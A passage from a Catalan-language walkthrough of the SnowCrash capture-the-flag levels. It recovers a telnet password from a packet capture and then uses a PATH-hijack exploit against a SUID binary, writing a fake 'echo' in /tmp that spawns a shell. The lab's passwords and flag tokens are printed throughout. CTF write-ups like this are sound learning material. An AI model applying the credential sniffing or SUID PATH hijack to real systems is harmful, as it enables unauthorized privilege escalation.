07:23:12.339542 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [.], ack 202, win 115, options [nop,nop,TS val 18592808 ecr 46280435], length 0
E..4..@.@.J<;...;....O/Y...t.......s.......
...(....
07:23:24.491452 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 179:180, ack 202, win 115, options [nop,nop,TS val 18594023 ecr 46280435], length 1
E..5..@.@.J:;...;....O/Y...t.......s.......
........l
07:23:24.496998 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [P.], seq 202:204, ack 180, win 453, options [nop,nop,TS val 46283475 ecr 18594023], length 2
E..6..@.@...;...;.../Y.O.......u.....r.....
..:......l
07:23:24.497158 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [.], ack 204, win 115, options [nop,nop,TS val 18594023 ecr 46283475], length 0
E..4..@.@.J:;...;....O/Y...u.......s.8.....
......:.
07:23:24.591456 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 180:181, ack 204, win 115, options [nop,nop,TS val 18594033 ecr 46283475], length 1
E..5..@.@.J8;...;....O/Y...u.......s.%.....
......:.e
07:23:24.597002 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [P.], seq 204:206, ack 181, win 453, options [nop,nop,TS val 46283500 ecr 18594033], length 2
E..6..@.@...;...;.../Y.O.......v.....S.....
..:......e
07:23:24.597220 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [.], ack 206, win 115, options [nop,nop,TS val 18594033 ecr 46283500], length 0
E..4..@.@.J8;...;....O/Y...v.......s.......
......:.
07:23:24.821113 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 181:182, ack 206, win 115, options [nop,nop,TS val 18594056 ecr 46283500], length 1
E..5..@.@.J6;...;....O/Y...v.......s.......
......:.v
07:23:24.828963 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [P.], seq 206:208, ack 182, win 453, options [nop,nop,TS val 46283558 ecr 18594056], length 2
E..6..@.@...;...;.../Y.O.......w...........
..;&.....v
07:23:24.829099 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [.], ack 208, win 115, options [nop,nop,TS val 18594056 ecr 46283558], length 0
E..4..@.@.J6;...;....O/Y...w.......s.......
......;&
07:23:24.911733 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 182:183, ack 208, win 115, options [nop,nop,TS val 18594065 ecr 46283558], length 1
E..5..@.@.J4;...;....O/Y...w.......s.......
......;&e
07:23:24.916960 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [P.], seq 208:210, ack 183, win 453, options [nop,nop,TS val 46283580 ecr 18594065], length 2
E..6..@.@...;...;.../Y.O.......x...........
..;<.....e
07:23:24.917093 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [.], ack 210, win 115, options [nop,nop,TS val 18594065 ecr 46283580], length 0
E..4..@.@.J4;...;....O/Y...x.......s.......
......;<
07:23:24.981645 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 183:184, ack 210, win 115, options [nop,nop,TS val 18594072 ecr 46283580], length 1
E..5..@.@.J2;...;....O/Y...x.......s.......
......;<l
07:23:24.988957 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [P.], seq 210:212, ack 184, win 453, options [nop,nop,TS val 46283598 ecr 18594072], length 2
E..6..@.@...;...;.../Y.O.......y...........
..;N.....l
07:23:24.989096 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [.], ack 212, win 115, options [nop,nop,TS val 18594072 ecr 46283598], length 0
E..4..@.@.J2;...;....O/Y...y.......s.......
......;N
07:23:25.311494 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 184:185, ack 212, win 115, options [nop,nop,TS val 18594105 ecr 46283598], length 1
E..5..@.@.J0;...;....O/Y...y.......s.V.....
...9..;NX
07:23:25.317086 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [P.], seq 212:214, ack 185, win 453, options [nop,nop,TS val 46283680 ecr 18594105], length 2
E..6..@.@...;...;.../Y.O.......z.....X.....
..;....9.X
07:23:25.317328 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [.], ack 214, win 115, options [nop,nop,TS val 18594105 ecr 46283680], length 0
E..4..@.@.J0;...;....O/Y...z.......s.
.....
...9..;.
07:23:26.091422 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 185:186, ack 214, win 115, options [nop,nop,TS val 18594183 ecr 46283680], length 1
E..5..@.@.J.;...;....O/Y...z.......s.......
......;.
07:23:26.094869 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [P.], seq 214:215, ack 186, win 453, options [nop,nop,TS val 46283874 ecr 18594183], length 1
E..5..@.@...;...;.../Y.O.......{...........
..<b.....
07:23:26.095123 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [.], ack 215, win 115, options [nop,nop,TS val 18594183 ecr 46283874], length 0
E..4..@.@.J.;...;....O/Y...{.......s.......
......<b
07:23:26.095219 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [P.], seq 215:228, ack 186, win 453, options [nop,nop,TS val 46283874 ecr 18594183], length 13
E..A..@.@..w;...;.../Y.O.......{....'......
..<b.....
Password: 
07:23:26.095329 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [.], ack 228, win 115, options [nop,nop,TS val 18594183 ecr 46283874], length 0
E..4..@.@.J-;...;....O/Y...{...%...s.......
......<b
07:23:34.363418 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 186:187, ack 228, win 115, options [nop,nop,TS val 18595010 ecr 46283874], length 1
E..5..@.@.J+;...;....O/Y...{...%...s.......
......<bf
07:23:34.400964 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [.], ack 187, win 453, options [nop,nop,TS val 46285951 ecr 18595010], length 0
E..4..@.@...;...;.../Y.O...%...|.....@.....
..D.....
07:23:35.253053 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 187:188, ack 228, win 115, options [nop,nop,TS val 18595099 ecr 46285951], length 1
E..5..@.@.J*;...;....O/Y...|...%...s|0.....
......D.t
07:23:35.253134 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [.], ack 188, win 453, options [nop,nop,TS val 46286164 ecr 18595099], length 0
E..4..@.@...;...;.../Y.O...%...}...........
..ET....
07:23:35.873401 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 188:189, ack 228, win 115, options [nop,nop,TS val 18595161 ecr 46286164], length 1
E..5..@.@.J);...;....O/Y...}...%...s.......
...Y..ET_
07:23:35.873472 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [.], ack 189, win 453, options [nop,nop,TS val 46286319 ecr 18595161], length 0
E..4..@.@...;...;.../Y.O...%...~.....7.....
..E....Y
07:23:36.343811 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 189:190, ack 228, win 115, options [nop,nop,TS val 18595208 ecr 46286319], length 1
E..5..@.@.J(;...;....O/Y...~...%...swQ.....
......E.w
07:23:36.343888 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [.], ack 190, win 453, options [nop,nop,TS val 46286436 ecr 18595208], length 0
E..4..@.@...;...;.../Y.O...%...............
..Fd....
07:23:36.573585 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 190:191, ack 228, win 115, options [nop,nop,TS val 18595231 ecr 46286436], length 1
E..5..@.@.J';...;....O/Y.......%...s.......
......Fda
07:23:36.573646 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [.], ack 191, win 453, options [nop,nop,TS val 46286494 ecr 18595231], length 0
E..4..@.@...;...;.../Y.O...%.........@.....
..F.....
07:23:36.803330 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 191:192, ack 228, win 115, options [nop,nop,TS val 18595254 ecr 46286494], length 1
E..5..@.@.J&;...;....O/Y.......%...s.r.....
......F.n
07:23:36.803391 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [.], ack 192, win 453, options [nop,nop,TS val 46286551 ecr 18595254], length 0
E..4..@.@..~;...;.../Y.O...%...............
..F.....
07:23:36.943261 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 192:193, ack 228, win 115, options [nop,nop,TS val 18595268 ecr 46286551], length 1
E..5..@.@.J%;...;....O/Y.......%...s.*.....
......F.d
07:23:36.943318 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [.], ack 193, win 453, options [nop,nop,TS val 46286586 ecr 18595268], length 0
E..4..@.@..};...;.../Y.O...%...............
..F.....
07:23:37.283708 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 193:194, ack 228, win 115, options [nop,nop,TS val 18595302 ecr 46286586], length 1
E..5..@.@.J$;...;....O/Y.......%...sz......
......F.r
07:23:37.283783 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [.], ack 194, win 453, options [nop,nop,TS val 46286671 ecr 18595302], length 0
E..4..@.@..|;...;.../Y.O...%.........E.....
..GO....
07:23:38.864101 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 194:195, ack 228, win 115, options [nop,nop,TS val 18595460 ecr 46286671], length 1
E..5..@.@.J#;...;....O/Y.......%...sl......
......GO.
07:23:38.864181 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [.], ack 195, win 453, options [nop,nop,TS val 46287066 ecr 18595460], length 0
E..4..@.@..{;...;.../Y.O...%...............
..H.....
07:23:39.233935 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 195:196, ack 228, win 115, options [nop,nop,TS val 18595497 ecr 46287066], length 1
E..5..@.@.J";...;....O/Y.......%...sk?.....
......H..
07:23:39.234016 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [.], ack 196, win 453, options [nop,nop,TS val 46287159 ecr 18595497], length 0
E..4..@.@..z;...;.../Y.O...%...............
..I7....
07:23:39.604364 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 196:197, ack 228, win 115, options [nop,nop,TS val 18595534 ecr 46287159], length 1
E..5..@.@.J!;...;....O/Y.......%...sj......
......I7.
07:23:39.604414 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [.], ack 197, win 453, options [nop,nop,TS val 46287251 ecr 18595534], length 0
E..4..@.@..y;...;.../Y.O...%...............
..I.....
07:23:40.374542 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 197:198, ack 228, win 115, options [nop,nop,TS val 18595611 ecr 46287251], length 1
E..5..@.@.J ;...;....O/Y.......%...s.......
......I.N
07:23:40.374620 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [.], ack 198, win 453, options [nop,nop,TS val 46287444 ecr 18595611], length 0
E..4..@.@..x;...;.../Y.O...%...............
..JT....
07:23:40.574439 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 198:199, ack 228, win 115, options [nop,nop,TS val 18595631 ecr 46287444], length 1
E..5..@.@.J.;...;....O/Y.......%...s.<.....
.../..JTD
07:23:40.574508 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [.], ack 199, win 453, options [nop,nop,TS val 46287494 ecr 18595631], length 0
E..4..@.@..w;...;.../Y.O...%...............
..J..../
07:23:42.264451 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 199:200, ack 228, win 115, options [nop,nop,TS val 18595800 ecr 46287494], length 1
E..5..@.@.J.;...;....O/Y.......%...s.`.....
......J.R
07:23:42.264529 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [.], ack 200, win 453, options [nop,nop,TS val 46287916 ecr 18595800], length 0
E..4..@.@..v;...;.../Y.O...%.........p.....
..L,....
07:23:43.574954 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 200:201, ack 228, win 115, options [nop,nop,TS val 18595931 ecr 46287916], length 1
E..5.   @.@.J.;...;....O/Y.......%...s.6.....
...[..L,e
07:23:43.575036 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [.], ack 201, win 453, options [nop,nop,TS val 46288244 ecr 18595931], length 0
E..4..@.@..u;...;.../Y.O...%...............
..Mt...[
07:23:44.014684 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 201:202, ack 228, win 115, options [nop,nop,TS val 18595975 ecr 46288244], length 1
E..5.
@.@.J.;...;....O/Y.......%...sw......
......Mtl
07:23:44.014742 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [.], ack 202, win 453, options [nop,nop,TS val 46288354 ecr 18595975], length 0
E..4..@.@..t;...;.../Y.O...%.........   .....
..M.....
07:23:44.635281 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 202:203, ack 228, win 115, options [nop,nop,TS val 18596037 ecr 46288354], length 1
E..5..@.@.J.;...;....O/Y.......%...sd......
......M..
07:23:44.635364 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [.], ack 203, win 453, options [nop,nop,TS val 46288509 ecr 18596037], length 0
E..4..@.@..s;...;.../Y.O...%........./.....
..N}....
07:23:44.805020 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 203:204, ack 228, win 115, options [nop,nop,TS val 18596054 ecr 46288509], length 1
E..5..@.@.J.;...;....O/Y.......%...s.g.....
......N}L
07:23:44.805072 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [.], ack 204, win 453, options [nop,nop,TS val 46288552 ecr 18596054], length 0
E..4..@.@..r;...;.../Y.O...%...............
..N.....
07:23:45.074939 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 204:205, ack 228, win 115, options [nop,nop,TS val 18596081 ecr 46288552], length 1
E..5..@.@.J.;...;....O/Y.......%...s. .....
......N.0
07:23:45.074992 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [.], ack 205, win 453, options [nop,nop,TS val 46288619 ecr 18596081], length 0
E..4..@.@..q;...;.../Y.O...%...............
..N.....
07:23:45.104894 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 205:206, ack 228, win 115, options [nop,nop,TS val 18596084 ecr 46288619], length 1
E..5..@.@.J.;...;....O/Y.......%...s.......
......N.L
07:23:45.104948 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [.], ack 206, win 453, options [nop,nop,TS val 46288626 ecr 18596084], length 0
E..4..@.@..p;...;.../Y.O...%...............
..N.....
07:23:45.965233 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 206:207, ack 228, win 115, options [nop,nop,TS val 18596170 ecr 46288626], length 1
E..5..@.@.J.;...;....O/Y.......%...s.{.....
...J..N.
07:23:45.965310 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [.], ack 207, win 453, options [nop,nop,TS val 46288842 ecr 18596170], length 0
E..4..@.@..o;...;.../Y.O...%.........Y.....
..O....J
07:23:45.972986 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [P.], seq 228:231, ack 207, win 453, options [nop,nop,TS val 46288844 ecr 18596170], length 3
E..7..@.@..k;...;.../Y.O...%.........?.....
..O....J.

07:23:45.973182 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [.], ack 231, win 115, options [nop,nop,TS val 18596170 ecr 46288844], length 0
E..4..@.@.J.;...;....O/Y.......(...s.......
...J..O.
07:23:48.730070 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [P.], seq 231:232, ack 207, win 453, options [nop,nop,TS val 46289533 ecr 18596170], length 1
E..5..@.@..l;...;.../Y.O...(...............
..R}...J.
07:23:48.730327 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [.], ack 232, win 115, options [nop,nop,TS val 18596446 ecr 46289533], length 0
E..4..@.@.J.;...;....O/Y.......)...s.......
...^..R}
07:23:48.730424 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [P.], seq 232:267, ack 207, win 453, options [nop,nop,TS val 46289533 ecr 18596446], length 35
E..W..@.@..I;...;.../Y.O...)...............
..R}...^.
Login incorrect
wwwbugs login: 
07:23:48.730579 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [.], ack 267, win 115, options [nop,nop,TS val 18596446 ecr 46289533], length 0
E..4..@.@.J.;...;....O/Y.......L...s.......
...^..R}
07:23:54.377030 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [F.], seq 207, ack 267, win 115, options [nop,nop,TS val 18597011 ecr 46289533], length 0
E..4..@.@.J.;...;....O/Y.......L...s.......
......R}
07:23:54.377594 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [F.], seq 267, ack 208, win 453, options [nop,nop,TS val 46290945 ecr 18597011], length 0
E..4..@.@..k;...;.../Y.O...L...............
..X.....
07:23:54.377802 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [.], ack 268, win 115, options [nop,nop,TS val 18597011 ecr 46290945], length 0
E..4..@.@.J.;...;....O/Y.......M...s.......
```
##### Descobrir agulla en el paller:
###### Analitzem una línia:
```bash
07:23:12.267566 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [S], seq 2635601089, win 14600, options [...], length 0
```
###### Desglossat:
```text
*Segment*	                *Significat*
07:23:12.267566	            timestamp
IP	                        protocol
59.233.235.218.39247	    IP origen + port
>	                        direcció
59.233.235.223.12121	    IP destí + port
Flags [S]	                tipus paquet TCP
seq ...	                    número de seqüència
win ...	                    finestra TCP
length 0	                bytes de dades
```
###### Els Flags TCP (handschacke):
```text
*Flag*      *Nom*	    *Significat*
[S]	        SYN	        client inicia connexió
[S.]	    SYN-ACK	    resposta servidor
[.]	        ACK	        confirmació del client
[P.]	    PUSH	    dades reals
[F.]	    FIN	        tancar connexió
```
###### No s'acaba de veure clar les lectura amb tcpdump, farem servir wireshark
```bash
sudo apt install wireshark
sudo usermod -aG wireshark $USER
wireshark
```
```text
Un cop obert el programa Wireshark
Open file .pcap que hem guardat en el host -> (packetCapture.pcap)
En la barra/camp filter escrivim "tcp" o "tcp 12121" -> 12121 port servidor(fixa) i 39247 és port client(random canvia)
Fem clic dret sobre alguna de les línies tcp i premem "Follow" seguit de "TCP Stream" o directament amb el shortcut (Ctrl+Alt+Maj+T)
S'obra una finestra amb el resultat següent on podrem veure pràcticament la contrasenya:

..%..%..&..... ..#..'..$..&..... ..#..'..$.. .....#.....'........... .38400,38400....#.SodaCan:0....'..DISPLAY.SodaCan:0......xterm.........."........!........"..".....b........b....	B.
..............................1.......!.."......"......!..........."........"..".............	..
.....................
Linux 2.6.38-8-generic-pae (::ffff:10.1.1.2) (pts/10)

..wwwbugs login: l.le.ev.ve.el.lX.X
..
Password: ft_wandr...NDRel.L0L
.
..
Login incorrect
wwwbugs login: 
```
###### Eus aquí un gran descobriment:
```text
El password és ft_wandr...NDRel.L0L, però esborrem els caràcters que precedeixen '.': => ft_waNDReL0L. Doncs els punts representen el codi 0x7f o DEL els non-printable "delete". Eliminant el caràcter immediatatament anterior (backspace)
```
##### Provem a veure si és el password de la flag
```bash
level02@SnowCrash:~$ su flag02
Password: ft_waNDReL0L
Don't forget to launch getflag !
flag02@SnowCrash:~$ getflag
Check flag.Here is your token : kooda2puivaav1idi4f57q8iq
flag02@SnowCrash:~$ 
```
---
### LEVEL03
#### Connexió al level03
```bash
flag02@SnowCrash:~$ ssh level03@snowcrash -p 4242Could not create directory '/home/flag/flag02/.ssh'.
The authenticity of host '[snowcrash]:4242 ([127.0.1.1]:4242)' can't be established.
ECDSA key fingerprint is 6a:83:c6:2e:df:7a:c8:e0:1c:bc:d8:84:32:e0:84:ad.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/flag/flag02/.ssh/known_hosts).
           _____                      _____               _     
          / ____|                    / ____|             | |    
         | (___  _ __   _____      _| |     _ __ __ _ ___| |__  
          \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \ 
          ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
         |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
                                                        
  Good luck & Have fun

          
level03@snowcrash's password: kooda2puivaav1idi4f57q8iq
level03@SnowCrash:~$ 
```
##### Llistar fitxers i directoris visibles i ocults:
```bash
level03@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level03 level03  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
level03@SnowCrash:~$
```
##### Observem que hi ha un fitxer anomenat level03 amb uns permisos un xic fóra del que és habitual
```bash
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```
##### Entre els permisos habituals (x,w i x) percebem (s)
```text
La lletra 's' significa SUID (Set User ID), això significa que el programa/arxiu s'executa amb permisos del propietari d'aquest mateix. 
```
```bash
level03@SnowCrash:~$ whoami
level03
```
```text
Per tant hauríem de poder executar el programa perque al ser al nivell 3, l'usuari és level03 al igual que els permisos del fitxer/programa.
```
##### Executem el programa
```bash
level03@SnowCrash:~$ ./level03
Exploit me
```
##### Analitzem el programa amb el comandament 'strings' per extreure text dins de binaris
```bash
level03@SnowCrash:~$ strings level03
/lib/ld-linux.so.2
KT{K
__gmon_start__
libc.so.6
_IO_stdin_used
setresgid
setresuid
system
getegid
geteuid
__libc_start_main
GLIBC_2.0
PTRh
UWVS
[^_]
/usr/bin/env echo Exploit me
;*2$"
GCC: (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
/home/user/level03
/usr/include/i386-linux-gnu/bits
/usr/include/i386-linux-gnu/sys
level03.c
types.h
types.h
long long int
__uid_t
envp
/home/user/level03/level03.c
long long unsigned int
setresuid
setresgid
unsigned char
GNU C 4.6.3
argc
__gid_t
short unsigned int
main
short int
argv
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.ctors
.dtors
.jcr
.dynamic
.got
.got.plt
.data
.bss
.comment
.debug_aranges
.debug_info
.debug_abbrev
.debug_line
.debug_str
.debug_loc
crtstuff.c
__CTOR_LIST__
__DTOR_LIST__
__JCR_LIST__
__do_global_dtors_aux
completed.6159
dtor_idx.6161
frame_dummy
__CTOR_END__
__FRAME_END__
__JCR_END__
__do_global_ctors_aux
level03.c
__init_array_end
_DYNAMIC
__init_array_start
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
setresuid@@GLIBC_2.0
__i686.get_pc_thunk.bx
data_start
_edata
_fini
geteuid@@GLIBC_2.0
getegid@@GLIBC_2.0
__DTOR_END__
__data_start
system@@GLIBC_2.0
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_start_main@@GLIBC_2.0
__libc_csu_init
_end
_start
_fp_hw
__bss_start
main
_Jv_RegisterClasses
setresgid@@GLIBC_2.0
_init
```
##### Observem línia prometadora de vulnerabilitat
```bash
/usr/bin/env echo Exploit me
```
```text
/usr/bin/env (És un programa que executa un altre programa utilitzant el PATH del sistema)

echo (Comanda que imprimeix text)

Exploit me (Argument)
```
##### Ens adonem que el comandament echo no té una ruta en el sistema
```text
El programa executa "echo" i no pas "/bin/echo". Per tant podríem crear un progrma maliciós anomenat "echo" i aquest ser cridat en la variable PATH de "env" (environment variables) en comptes del "echo" real
```
##### Creem el nostre propi programa maliciós anomenat "echo" en el direcori /tmp i li donem permisos
```bash
cd /tmp
echo '#!/bin/sh' > echo
echo '/bin/sh' >> echo
chmod +x echo
```
##### Afegim a la variable PATH el directori /tmp perque trobi primer el nostre progrma maliciós "echo"
```bash
level03@SnowCrash:/tmp$ export PATH=/tmp:$PATH
```
##### Comprovem que així sigui
```bash
level03@SnowCrash:~$ env | grep "PATH"
PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
```
##### Tornem al /home del usuari level03 i executem el programa amb el mateix nom que ens havíem trobat al inici
```bash
level03@SnowCrash:~$ ./level03
```
##### Sembla que ha funcionat, mirem quin usuari som ara
```bash
$ whoami
flag03
```
##### Com que ja som usuari flag03 ja podem executar el comandament getflag i podem obtenir el token/password pel següent nivell
```bash
$ getflag
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
---
### LEVEL04
#### Connexió al level04
